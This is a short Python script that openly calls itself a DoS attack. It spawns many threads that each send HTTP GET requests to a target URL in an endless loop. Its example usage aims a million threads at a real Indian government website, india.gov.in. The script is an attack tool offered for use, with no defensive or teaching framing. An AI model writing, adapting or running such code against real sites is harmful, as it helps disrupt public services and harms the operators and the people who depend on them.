import requests
import threading
import time

def dos_attack(target_url):
    while True:
        try:
            response = requests.get(target_url)
            if response.status_code >= 400:
                print(f"Error: Received status code {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

def start_attack(target_url, num_threads):
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=dos_attack, args=(target_url,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

# Example usage
target_url = "https://www.india.gov.in"
num_threads = 1000000

print(f"Starting DoS attack on {target_url} with {num_threads} threads...")
start_attack(target_url, num_threads)